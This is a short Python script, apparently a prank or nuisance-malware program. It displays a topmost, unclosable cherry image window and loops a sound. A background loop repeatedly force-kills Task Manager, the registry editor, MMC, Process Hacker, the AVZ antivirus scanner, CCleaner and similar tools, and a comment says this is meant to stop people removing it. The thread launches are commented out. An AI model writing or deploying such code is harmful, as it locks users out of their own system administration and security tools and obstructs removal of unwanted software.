import customtkinter
from PIL import Image
import os
import threading
import time
import pygame
import cv2

pygame.mixer.init()
assets = os.path.join(os.path.dirname(os.path.realpath(__file__)), "assets")

def cherry_window():
    top = customtkinter.CTk()
    top.title("cherry")
    top.geometry("144x144")

    cherry = customtkinter.CTkImage(Image.open(os.path.join(assets, 'cherry.jpg')), size=(144,144))

    label = customtkinter.CTkLabel(top, image=cherry, text="", height=144)
    label.grid(row=0, column=0, sticky="nsew")

    top.attributes("-topmost", True)
    top.attributes("-disabled", True)

    pygame.mixer.music.load(os.path.join(assets, 'cherry.mp3'))
    pygame.mixer.music.play(32767)
    top.mainloop()    

def blocked_apps():
	while True:
		time.sleep(5)
		os.system('tasklist | findstr /i "mmc.exe" && taskkill /f /im mmc.exe')
		os.system('tasklist | findstr /i "Taskmgr.exe" && taskkill /f /im Taskmgr.exe')
		os.system('tasklist | findstr /i "regedit.exe" && taskkill /f /im regedit.exe')
		
        # Trying to block MHelper (please god just work) and apps like Process Hacker, RegAlyzer, etc. (basically blocking nedohackers' tools)
		os.system('tasklist | findstr /i "MHelper_full.exe" && taskkill /f /im MHelper_full.exe')
		os.system('tasklist | findstr /i "ProcessHacker.exe" && taskkill /f /im ProcessHacker.exe')
		os.system('tasklist | findstr /i "RegAlyzer.exe" && taskkill /f /im RegAlyzer.exe')
		os.system('tasklist | findstr /i "SU.exe" && taskkill /f /im SU.exe')
		os.system('tasklist | findstr /i "avz.exe" && taskkill /f /im avz.exe')
		os.system('tasklist | findstr /i "CCleaner.exe" && taskkill /f /im CCleaner.exe') # idk whats the real name
		os.system('tasklist | findstr /i "CCleaner64.exe" && taskkill /f /im CCleaner64.exe') # idk whats the real name

block_apps_thread = threading.Thread(target=blocked_apps)
#block_apps_thread.start()

cherry_thread = threading.Thread(target=cherry_window)
#cherry_thread.start()